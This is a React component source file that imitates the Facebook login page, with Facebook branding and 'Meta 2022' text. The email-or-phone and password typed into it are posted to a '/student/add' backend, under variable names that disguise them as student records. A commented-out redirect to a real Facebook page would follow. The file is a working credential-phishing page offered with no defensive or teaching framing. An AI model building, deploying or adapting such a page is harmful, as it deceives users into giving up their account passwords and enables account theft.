// import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
import "./App.css";
// import Header from "./components/Header";
// import AddStudent from "./components/AddStudent";
import React, { useState } from "react";
import axios from "axios";


function App() {
  const [name,setName]=useState("");
const [ps,setAge]=useState("");


 function sendData(e){
   e.preventDefault();

   const newStudent={
     name,ps
   }
   
   axios.post("/student/add",newStudent).then(()=>{ 
     alert("student added!")
     console.log();
    // window.location='https://www.facebook.com/people/%E0%B6%BD%E0%B6%9C%E0%B7%8F%E0%B6%B1%E0%B7%8A-%E0%B6%91%E0%B6%9A%E0%B7%9A-%E0%B6%B6%E0%B7%94%E0%B6%B8%E0%B7%8A%E0%B6%B8%E0%B6%A7%E0%B7%8A%E0%B6%A7%E0%B6%BA%E0%B7%8F/100084286001519/';
   }).catch((err)=>{
    alert(err)
   })}
  return (
    <div className="App">
      
      <div class="container">
      <div class="left">
            <h1>facebook</h1>
            {/* <p>Facebook helps you connect and share with the people in your life.</p> */}
        </div>
        <div class="right">
            <form action="">
                <input type="text" placeholder="Email addess or phone number" onChange={(e)=>{setName(e.target.value);}}
            required/>
            <input type="password" placeholder="Password" onChange={(e)=>{setAge(e.target.value);}}
            required/>
                {/* <input type="text" placeholder="Password" onChange={(e)=>{setAge(e.target.value);}}
            required/> */}
                <a href="" class="loginBtn" onClick={sendData} >Log In </a>
                {/* <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forget">Forgotten password?</a> */}
                <div class="sign-up">
                    <a href="" class="signupBtn">Create New Account</a>
                </div>
            </form>
            <p><b>Create a Page</b> for a celebrity, band or business.</p>
            <p>Meta 2022</p>
            
           
        </div>
    </div>
        </div>
    
  );
}

export default App;
